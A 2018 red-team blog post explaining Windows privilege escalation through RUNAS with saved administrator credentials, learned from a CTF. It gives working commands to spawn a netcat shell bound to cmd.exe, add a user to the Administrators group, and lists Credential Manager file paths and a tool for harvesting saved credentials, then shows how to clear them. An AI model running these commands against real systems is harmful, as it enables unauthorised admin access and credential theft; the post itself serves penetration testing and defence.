Title: RUNAS ftw!
Summary: A while ago I was playing a CTF, **RUNAS** was one of the ways to run a **cmd.exe** process with elevated privilege. This sounds basic but it never occured to me to use it for privilegde escalation so I decided to play around with it some more.
Date: 2018-12-09 22:00
Modified: 2018-12-09 22:01
Category: Red-Team
Tags: Red-Team, priv-esc, MITRE-Attack:T1134, Access Token Manipulation
Slug: RUNAS_administrator
Authors: pebkac

# Background
A while ago I was playing a CTF, where I had to use **RUNAS** as a ways to run a **cmd.exe** process with elevated privilege.
This sounds basic but it never occured to me to use it for privilegde escalation so I decided to play around with it some more, but when you think about it.<br /><br />How many users/sysadmins are not tired of entering their password everytime you need to start a process with administrator privilege. Selecting the **save creditials** checkbox is way of making your life easier. Ofcourse every sysadmin, developer or cyber security professional knows **NOT** to do this.<br /><br />But after playing with it, I found it happens more often than you might think.<br /> Thus creating opportunity for attackers.

# The command used
When we look at the documentation of the **RUNAS** command you get the following:

```batch
RUNAS
Execute a program under a different user account (non-elevated).

Syntax
      RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ]
         /user:UserName program

      RUNAS [ [/noprofile | /profile] [/env] [/savecred] ]
         /smartcard [/user:UserName] program

      Display the trust levels that can be used:
      RUNAS /showtrustlevels

      Run a program at a given TrustLevel:
      RUNAS /trustlevel:TrustLevel program

Key
   /noprofile       Do not load the user's profile.
                    This causes the application to load more quickly, but
                    can cause some applications to malfunction.

   /profile         Load the user's profile. (default)

   /env             Use the current environment instead of user's.

   /netonly         Use the credentials for remote access only.

   /savecred        Use credentials previously saved by the user.
                    This option is not available on Windows 7 Home or
                    Starter Editions and will be ignored.

   /smartcard       Load the credentials from a smartcard.

   /user            UserName in the form USER@DOMAIN or DOMAIN\USER

   /trustlevel Level  One of levels enumerated in /showtrustlevels.
                      RunAs is not able to launch an application with an elevated
                      access token.

   program          The program to run.
```
# How does this work you ask ?
What makes this possible is the **/savecred** key that can be used if the user has previously selected the **save credentials** checkbox when running a process as a different user. The Second place I found this to be true is the **Developer mode** in windows 10 which is awesome because there are some developers in a company that will turn this on. Keep in mind that there are exeptions when GPO is applied etc. However these hosts will sometimes hold .txt files with credentials to the production enviroment. You can only imagine why these are interesting for an attacker.
# The Scenario
Microsoft Windows will sometimes give you a pop-up if you need to run something as a different or privileged user and Let's be honest it's just easier to check the box so that you don't have to do this over and over again during testing. After this the user has saved the administrator credentials to the Windows Credential Manager<br />
However the user may forget to clear the saved credential database afterwards. 
<br />
<br />
So eventhough the documentation states **(non-elevated)** you might just want to try this when you need escalate privilegde during Red-Team activities.


# How to use
I found 3 options that worked while I was testing but there are more when you go down the rabbit hole.<br />
## Reverse-shell
This works if you have copied a executable like netcat (nc) on the system first.
```batch
runas /noprofile /user:<computername>\Administrator /savecred "nc -lvp 4444 -e cmd.exe"
```
## Adding your low privilegde user to the administrators group
This might mean you need to restart your shell before it takes affect.
```batch
runas /noprofile /user:<computername>\Administrator /savecred "net localgroup administrators <username> /add"
```
## Opening a file that has a different owner
Don't forget to escape the pair of double quotes ;-)
```batch
Runas /noprofile /user:<computername>\Administrator /savecred "notepad \"C:\work\demo file.txt\""
```
In theory you could change the local computername for a domain if you want to test this in a corporate enviroment.


# Other means of attack

However these results raised more questions, where are these password stored? is there a way of decrypting them to harvest the credentials after you gained a privileged shell. I was fortunate enough to talk to a colleague who pointed me towards a tool from nirsoft. [Nirsoft's CredentialsFileView](https://www.nirsoft.net/utils/credentials_file_view.html "Nirsoft credential file viewer")<br /><br />

## Database locations
```batch
C:\Users\[User_Profile]\AppData\Roaming\Microsoft\Credentials (Windows Vista and later)
C:\Users\[User_Profile]\AppData\Local\Microsoft\Credentials (Windows Vista and later)
C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials (Windows 8 and later)
C:\Documents_and_Settings\[User_Profile]\Application_Data\Microsoft\Credentials (Windows XP)
C:\Documents_and_Settings\[User_Profile]\Local_Settings\Application_Data\Microsoft\Credentials (Windows XP)   
```

# Clearing the database
I think its only fair if I tell you how to clear the database of these saved credentials.<br />
Especially because it only takes 3 steps.<br /><br />
1. Click Start > Control Panel > User Accounts > Credential Manager.<br />
2. Select the Windows Credentials option.<br />
3. Then click Remove from Vault or Remove (depending upon which version of Windows you are running).<br />